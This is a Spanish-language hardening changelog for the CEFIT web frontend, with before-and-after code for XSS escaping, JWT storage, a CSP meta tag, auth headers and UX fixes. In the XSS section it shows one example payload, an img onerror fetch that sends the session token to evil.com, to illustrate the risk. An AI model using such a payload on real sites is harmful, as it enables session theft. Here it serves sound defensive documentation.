# Guía de Hardening — Frontend CEFIT

> Registro de cambios de seguridad y UX aplicados al cliente web (`client/`)

---

## Índice

1. [Resumen](#resumen)
2. [XSS en dashboard.js](#1-xss-en-dashboardjs--crítico)
3. [Authorization header faltante](#2-authorization-header-faltante-en-petición-admin--alto)
4. [localStorage → sessionStorage](#3-jwt-en-localstorage--medio)
5. [alert() reemplazado](#4-alertmessage--bajo--ux)
6. [console.log en producción](#5-consolelog-en-producción--bajo)
7. [URLs hardcodeadas](#6-urls-hardcodeadas-dispersas--bajo)
8. [Token ausente en nueva_password](#7-sin-validación-de-token-en-nueva_passwordhtml--medio)
9. [Scripts cruzados](#8-registro-js-cargado-en-indexhtml--bajo)
10. [autocomplete y accesibilidad](#9-atributos-autocomplete-faltantes--ux--bajo)
11. [Content-Security-Policy meta](#10-content-security-policy-meta--medio)
12. [Diseño visual](#11-rediseño-visual)
13. [Checklist](#checklist-de-despliegue)

---

## Resumen

| # | Vulnerabilidad / Problema | Archivo | Severidad | OWASP |
|---|---|---|---|---|
| 1 | XSS: datos del servidor en `innerHTML` sin escapar | `dashboard.js` | **Crítico** | A03 - Injection |
| 2 | Authorization header faltante en llamada a `/api/users` | `dashboard.js` | **Alto** | A01 - Broken Access Control |
| 3 | JWT en `localStorage` accesible por cualquier script | `login.js`, `dashboard.js` | Medio | A02 - Cryptographic Failures |
| 4 | `alert()` para feedback de usuario | todos los JS | Bajo / UX | — |
| 5 | `console.log/error` en producción | todos los JS | Bajo | A09 - Security Logging |
| 6 | URLs hardcodeadas `http://localhost:3000` | `registro.html`, `registro.js` | Bajo | A05 - Misconfiguration |
| 7 | Formulario de contraseña visible sin token en URL | `nueva_password.html` | Medio | A07 - Auth Failures |
| 8 | `registro.js` cargado en `index.html` | `index.html` | Bajo | A05 - Misconfiguration |
| 9 | Sin atributos `autocomplete` | todos los HTML | Bajo / UX | — |
| 10 | Sin Content-Security-Policy | todos los HTML | Medio | A05 - Misconfiguration |
| 11 | CSS mínimo sin estados de carga ni feedback | `style.css` | UX | — |

---

## 1. XSS en `dashboard.js` — **Crítico**

### Antes

```js
// VULNERABLE: u.email y u.rol se insertan directamente como HTML
html += `<td>${u.email}</td><td>${u.rol}</td>`;
document.getElementById("contenido-privado").innerHTML = html;
```

Si la base de datos tuviese un email como:
```
<img src=x onerror="fetch('https://evil.com/?t='+sessionStorage.token)">
```
ese código se ejecutaría en el navegador de cualquier admin que cargara el panel.

### Después

```js
function esc(str) {
  const d = document.createElement('div');
  d.textContent = str ?? '';
  return d.innerHTML;
}

// Todos los datos del servidor pasan por esc() antes de ir a innerHTML
html += `<td>${esc(u.email)}</td><td>${esc(u.rol)}</td>`;
```

**Por qué funciona:** `textContent` asigna el valor como texto plano; al leer `innerHTML` después, el navegador ya convirtió `<`, `>`, `"`, `&` en entidades HTML (`&lt;`, `&gt;`, etc.), imposibilitando la inyección.

---

## 2. Authorization header faltante en petición admin — **Alto**

### Antes

```js
// El endpoint /api/users requiere verifyToken + isAdmin en el servidor
// pero el fetch no enviaba token → siempre daba 401/403
const res = await fetch("http://localhost:3000/api/users");
```

### Después

```js
const res = await fetch(`${API_URL}/users`, {
  headers: { 'Authorization': `Bearer ${token}` },
});
```

Además se añadió manejo explícito: si el servidor devuelve `401` o `403` (token inválido / expirado), el dashboard hace `logout()` automáticamente.

---

## 3. JWT en `localStorage` → `sessionStorage` — Medio

### Antes

```js
localStorage.setItem("token", result.token);
```

`localStorage` persiste indefinidamente entre pestañas y sesiones. Cualquier script con acceso al origen (extensiones, XSS) puede leerlo.

### Después

```js
sessionStorage.setItem('token', data.token);
```

`sessionStorage` se borra al cerrar la pestaña, reduciendo la ventana de exposición. El token sigue siendo legible por JS (limitación del esquema sin httpOnly cookies), pero se elimina la persistencia innecesaria.

**Nota:** La solución definitiva es usar cookies `httpOnly; Secure; SameSite=Strict` gestionadas por el servidor. Eso requiere un cambio en el backend fuera del alcance de este frontend.

---

## 4. `alert(message)` → mensajes inline — Bajo / UX

### Antes

```js
alert(result.message);  // en login.js, registro.js, dashboard.js
```

`alert()` bloquea el hilo principal, no se puede estilizar, y expone directamente los mensajes del servidor al usuario sin filtro.

### Después

```js
mostrarMensaje(data.message, res.ok ? 'ok' : 'err');
```

`mostrarMensaje()` (en `constantes.js`) inserta el texto con `.textContent` (no `innerHTML`) en un `div#mensaje` estilizado con colores según tipo (`ok` / `err` / `inf`). El usuario ve el mensaje en contexto sin interrupciones.

---

## 5. `console.log/error` en producción — Bajo

### Antes

```js
console.error("Error en login:", error);    // login.js
console.log(e);                              // olvide.js, nueva_password.js
```

Los `console` exponen stack traces, nombres de funciones y rutas de archivos en las DevTools de cualquier usuario. En aplicaciones de producción suponen una fuga de información del lado del cliente.

### Después

Todos los bloques `catch` reemplazados por `catch { }` (sin loguear el objeto de error). El feedback al usuario se hace vía `mostrarMensaje()` con texto genérico.

---

## 6. URLs hardcodeadas dispersas — Bajo

### Antes

```js
// En registro.html (script inline) y registro.js:
fetch("http://localhost:3000/api/register", ...)

// En login.js:
fetch("http://localhost:3000/api/login", ...)
```

Las URLs hardcodeadas a `localhost` hacen imposible desplegar en staging o producción sin editar el código fuente. Además, `registro.html` tenía un script inline duplicando la lógica de `registro.js`.

### Después

```js
// constantes.js — un solo lugar para cambiar la URL base
const API_URL = 'http://localhost:3000/api';

// Todos los fetch usan:
fetch(`${API_URL}/login`, ...)
fetch(`${API_URL}/register`, ...)
```

El script inline de `registro.html` fue eliminado. Toda la lógica de registro vive en `registro.js`.

---

## 7. Sin validación de token en `nueva_password.html` — Medio

### Antes

El formulario de nueva contraseña se mostraba siempre, aunque no hubiera `?token=` en la URL. Un usuario podía rellenar y enviar el formulario con un token vacío, causando un error confuso del servidor.

### Después

```js
const token = params.get('token');

if (!token) {
  document.getElementById('contenidoForm').style.display = 'none';
  mostrarMensaje('El enlace de recuperación no es válido o ya expiró. Solicita uno nuevo.', 'err');
}
```

Si no hay token, el formulario se oculta y se muestra un mensaje claro antes de que el usuario intente cualquier cosa.

---

## 8. `registro.js` cargado en `index.html` — Bajo

### Antes

```html
<!-- index.html cargaba ambos scripts -->
<script src="/client/assets/js/login.js"></script>
<script src="/client/assets/js/registro.js"></script>
```

`registro.js` intentaba adjuntar un listener a `#registroForm`, que no existe en `index.html`, generando un error JS silencioso en cada carga del login.

### Después

```html
<!-- index.html: solo los scripts necesarios -->
<script src="/client/assets/js/constantes.js"></script>
<script src="/client/assets/js/login.js"></script>
```

Cada página carga únicamente los scripts que necesita.

---

## 9. Atributos `autocomplete` faltantes — Bajo / UX

### Antes

Ningún input tenía atributos `autocomplete`, lo que impide que los gestores de contraseñas (1Password, Bitwarden, el del propio navegador) identifiquen los campos correctamente.

### Después

```html
<input type="email"    autocomplete="email">
<input type="password" autocomplete="current-password">  <!-- login -->
<input type="password" autocomplete="new-password">       <!-- registro / nueva contraseña -->
<input type="text"     autocomplete="given-name">         <!-- nombre -->
```

Los gestores de contraseñas pueden autocompletar y generar contraseñas seguras, lo que en la práctica mejora la seguridad real de los usuarios.

---

## 10. Content-Security-Policy meta — Medio

### Antes

Sin CSP, el navegador ejecuta cualquier script del origen, incluyendo los inyectados por extensiones maliciosas o XSS reflejado.

### Después

Añadido en todos los HTML:

```html
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self';
               script-src 'self';
               style-src 'self';
               img-src 'self' data:;
               connect-src 'self' http://localhost:3000">
```

- `script-src 'self'` — bloquea scripts inline y de orígenes externos.
- `connect-src` — restringe los fetch a `self` y la API.
- No se usa `'unsafe-inline'` ni `'unsafe-eval'`.

**Nota:** La CSP vía meta tag es mejor que nada, pero la definitiva debe venir como cabecera HTTP (`Content-Security-Policy`) configurada en el reverse proxy (nginx). El backend con Helmet ya añade cabeceras de seguridad al API.

---

## 11. Rediseño visual

### Antes

- CSS sin variables, colores hardcodeados
- Sin estados de carga en botones
- Sin feedback visual de errores (todo era `alert()`)
- Sin indicador de fuerza de contraseña
- Sin botón para ver/ocultar contraseña
- Sin branding visible

### Después

| Elemento | Cambio |
|---|---|
| Variables CSS | `--brand`, `--ok`, `--err`, `--border`, etc. para coherencia |
| Tipografía | System font stack (sin CDN externo) |
| Inputs | Focus ring de color de marca, placeholder en gris claro |
| Botones | Estado `disabled` + spinner CSS animado durante peticiones |
| Mensajes | Div coloreado por tipo: verde (ok), rojo (error), azul (info) |
| Contraseña | Barra de fuerza (débil → fuerte) + toggle mostrar/ocultar |
| Branding | Cabecera `CEFIT` en cada tarjeta |
| Dashboard | Chips de rol con color, tabla con cabeceras, botón logout consistente |
| Responsive | Padding ajustado en `<480px` |

---

## Checklist de despliegue

- [ ] Cambiar `API_URL` en `constantes.js` por la URL del entorno (staging/producción)
- [ ] Actualizar `connect-src` en el meta CSP de cada HTML con la URL real del API
- [ ] Configurar CSP como cabecera HTTP en el reverse proxy (nginx), no solo como meta tag
- [ ] Evaluar migrar a cookies `httpOnly; Secure; SameSite=Strict` para eliminar el JWT de `sessionStorage`
- [ ] Configurar `ALLOWED_ORIGINS` en `.env` con el dominio real del frontend

---

*Hardening aplicado siguiendo OWASP Top 10 2021.*
